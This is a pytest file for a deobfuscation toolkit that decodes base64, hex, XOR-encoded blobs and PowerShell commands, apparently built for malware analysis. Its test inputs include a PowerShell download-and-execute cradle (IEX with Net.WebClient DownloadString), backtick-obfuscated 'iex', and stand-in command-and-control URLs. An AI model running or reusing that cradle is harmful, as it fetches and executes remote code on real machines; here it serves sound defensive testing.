"""Tests for tools/deobfuscation.py — pure-Python, real round trips."""
import base64
import pytest


class TestDecodeChain:
    def test_base64(self):
        from tools.deobfuscation import decode_chain
        enc = base64.b64encode(b"http://evil.example").decode()
        r = decode_chain(enc, ["base64"])
        assert r["success"] is True
        assert r["result"] == "http://evil.example"

    def test_multi_stage(self):
        from tools.deobfuscation import decode_chain
        # base64(reverse("abc")) → decode base64 then reverse
        inner = "cba"
        enc = base64.b64encode(inner.encode()).decode()
        r = decode_chain(enc, ["base64", "reverse"])
        assert r["result"] == "abc"
        assert len(r["stages"]) == 2

    def test_unknown_op_fails_cleanly(self):
        from tools.deobfuscation import decode_chain
        r = decode_chain("x", ["nope"])
        assert r["success"] is False
        assert "nope" in r["error"]


class TestHexDecode:
    def test_tolerant(self):
        from tools.deobfuscation import hex_decode
        assert hex_decode("4d 5a")["result"].startswith("MZ")
        assert hex_decode("0x4d5a")["result"].startswith("MZ")


class TestXorBruteforce:
    def test_finds_key(self, tmp_path):
        from tools.deobfuscation import xor_bruteforce
        plain = b"http://c2.example/gate.php " * 4
        key = 0x5A
        blob = bytes(b ^ key for b in plain)
        f = tmp_path / "x.bin"
        f.write_bytes(blob)
        r = xor_bruteforce(str(f))
        assert r["success"] is True
        assert r["candidates"][0]["key_hex"] == "5a"

    def test_missing_file(self):
        from tools.deobfuscation import xor_bruteforce
        r = xor_bruteforce("/no/such/file")
        assert r["success"] is False


class TestBase64Hunt:
    def test_finds_embedded_blob(self, tmp_path):
        from tools.deobfuscation import base64_hunt
        secret = base64.b64encode(b"this is a hidden payload string").decode()
        f = tmp_path / "doc.txt"
        f.write_text(f"noise noise {secret} more noise")
        r = base64_hunt(str(f))
        assert r["success"] is True
        assert r["count"] >= 1


class TestPowershellDecode:
    def test_encoded_command(self):
        from tools.deobfuscation import powershell_decode
        script = 'IEX(New-Object Net.WebClient).DownloadString("http://x")'
        enc = base64.b64encode(script.encode("utf-16-le")).decode()
        r = powershell_decode(f"powershell -nop -enc {enc}")
        assert r["encoded_command_found"] is True
        assert "DownloadString" in r["result"]

    def test_backtick_and_concat_normalized(self):
        from tools.deobfuscation import powershell_decode
        r = powershell_decode("i`e`x ('down'+'load')")
        assert "iex" in r["result"].lower()
        assert "download" in r["result"].lower()


class TestJsBeautify:
    def test_output_evidence_blocked(self, tmp_path):
        from tools.deobfuscation import js_beautify
        f = tmp_path / "a.js"
        f.write_text("var a=1")
        with pytest.raises(Exception):
            js_beautify(str(f), output_path="/cases/x/evidence/out.js")
